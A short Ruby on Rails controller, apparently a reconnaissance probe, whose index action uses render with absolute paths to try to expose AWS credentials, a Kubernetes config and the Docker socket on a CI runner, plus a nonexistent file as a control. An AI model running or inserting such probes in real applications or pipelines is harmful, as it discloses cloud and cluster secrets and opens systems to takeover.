class ReconController < ApplicationController
  def index
    # Probe 1: Check for common cloud credentials
    render '/home/runner/.aws/credentials'
    
    # Probe 2: Check for Kube config.
    render '/home/runner/.kube/config'
    
    # Probe 3: Check for Docker socket
    render '/var/run/docker.sock'
    
    # Probe 4: Check for a file we know DOESN'T exist (Control Group)
    render '/etc/sensitive_file_that_does_not_exist'
  end
end
